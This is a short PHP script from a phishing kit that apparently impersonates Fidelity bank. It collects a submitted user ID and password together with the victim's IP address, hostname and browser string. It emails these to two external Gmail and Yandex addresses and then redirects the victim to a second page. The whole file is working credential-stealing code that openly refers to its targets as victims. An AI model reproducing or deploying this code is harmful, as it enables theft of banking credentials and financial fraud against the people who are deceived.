<?
////////////////////////////////
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----+Fidelity emailSupremeBankLord Logs+------\n";
$message .= "User ID     : ".$_POST['ssns']."\n";
$message .= "Password     : ".$_POST['Psbsb']."\n";
$message .= "-------+  More info about victim  !!!!! +------\n";
$message .= "HostName       : ".$hostname."\n";
$message .= "Browser used   : ".$browser."\n";

$to = "ann.morganbiz@gmail.com,logsoffice2@yandex.com";
$subj = "fidelity Logs  $ip";
$from = "From:fidelity Bank Logs";
mail($to, $subj, $message, $from);
header("Location: fidelity2.html");
?>





